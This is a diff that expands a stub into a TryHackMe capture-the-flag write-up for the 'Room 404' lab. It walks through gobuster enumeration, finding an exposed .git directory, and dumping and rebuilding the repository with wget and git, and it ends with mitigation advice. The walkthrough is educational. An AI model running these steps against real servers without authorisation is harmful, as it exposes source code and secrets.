@@ -1,20 +1,153 @@
-# Challenge Name: Room 404
-# Platform: TryHackMe
+# 🏨 Room 404 — TryHackMe Write-Up
 
-## Overview
-He booked the quiet room. It's not on the floor plan, not in the brochure, not on any door. But port 8080 is wide open, and the rooms it never lists are the ones worth finding.
+![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
+![Category](https://img.shields.io/badge/Category-Web%20Security-blue)
+![Focus](https://img.shields.io/badge/Focus-Git%20Exposure-orange)
 
-He booked the quiet room. It's not on the floor plan, not in the brochure, not on any door. But port 8080 is wide open, and the rooms it never lists are the ones worth finding.
+---
 
-Welcome to the Byte Lotus, where the WiFi is open, the app is free, and the concierge already knows your coffee order. You spend these first days as a guest who simply notices things — a room that isn't on the floor plan, packets that leave every night at the same hour, a profile assembled from two breakfasts and a livestream.
+## 📌 Overview
 
-The Byte Lotus guest-experience platform went live in a hurry, and the night-shift developer shipped more than the website.
+The **Room 404** challenge simulates a real-world web application misconfiguration where sensitive development artifacts are unintentionally exposed.
 
-**Difficulty:** Easy  
-**Skills:** Directory Enumeration, Git exploitation
+The scenario hints at hidden endpoints and overlooked services — particularly a web service running on **port 8080**. The goal is to enumerate, identify weaknesses, and extract the flag.
 
+---
 
-## Enumeration
-## Exploitation
-## Flag
-## Lessons Learned
+## 🎯 Objectives
+
+* Perform directory enumeration
+* Identify exposed sensitive resources
+* Exploit Git repository leakage
+* Retrieve the flag
+
+---
+
+## 🔍 Enumeration
+
+We begin by scanning the target using **Gobuster**.
+
+### Command
+
+```bash
+gobuster dir -u http://<TARGET_IP>:8080 -w /usr/share/wordlists/wordlists/wordlist.txt
+```
+
+### Key Findings
+
+* `/.git` → Exposed Git repository ⚠️
+* `/app.js` → Frontend JavaScript
+
+📸 *Screenshot:*
+![Gobuster Scan](docs/screenshots/gobuster-scan.png)
+
+---
+
+## 🧠 Analysis
+
+### app.js
+
+The file contains only a minimal frontend stub:
+
+```javascript
+const API = "/api/guest";
+```
+
+No sensitive data is exposed here, indicating the vulnerability lies deeper.
+
+---
+
+## 💥 Exploitation
+
+### Step 1: Access Git Directory
+
+```
+http://<TARGET_IP>:8080/.git
+```
+
+📸 *Screenshot:*
+![Git Exposure](docs/screenshots/git-exposure.png)
+
+---
+
+### Step 2: Dump the Repository
+
+```bash
+wget -r -np -R "index.html*" http://<TARGET_IP>:8080/.git/
+```
+
+📸 *Screenshot:*
+![Repo Dump](docs/screenshots/repo-dump.png)
+
+---
+
+### Step 3: Rebuild the Project
+
+```bash
+cd <TARGET_IP>:8080
+git checkout -- .
+```
+
+---
+
+### Step 4: Discover the Flag
+
+```bash
+cat README.md
+```
+
+📸 *Screenshot:*
+![Flag](docs/screenshots/flag.png)
+
+---
+
+## 🚩 Flag
+
+```
+Try yourself and get the flag
+```
+
+---
+
+## 📚 Lessons Learned
+
+* Directory enumeration reveals hidden attack surfaces
+* Exposed `.git` directories can leak full source code
+* Attackers can reconstruct repositories using simple tools
+* Misconfigurations are a major real-world risk
+
+---
+
+## 🛡️ Mitigation
+
+* Block access to `.git` directories via server config
+* Never deploy development artifacts to production
+* Perform security audits before deployment
+
+---
+
+## 📦 Tools Used
+
+* Gobuster
+* Wget
+* Git
+
+---
+
+## 📈 Key Takeaway
+
+Even simple misconfigurations like exposing a `.git` directory can lead to **complete application compromise**. Proper deployment hygiene is critical in web security.
+
+---
+
+## 👨‍💻 Author
+
+Sudharsan Chandran
+Cybersecurity Enthusiast | CTF Player
+
+---
+
+## ⭐ If you found this useful
+
+Give the repo a ⭐ and follow for more write-ups!
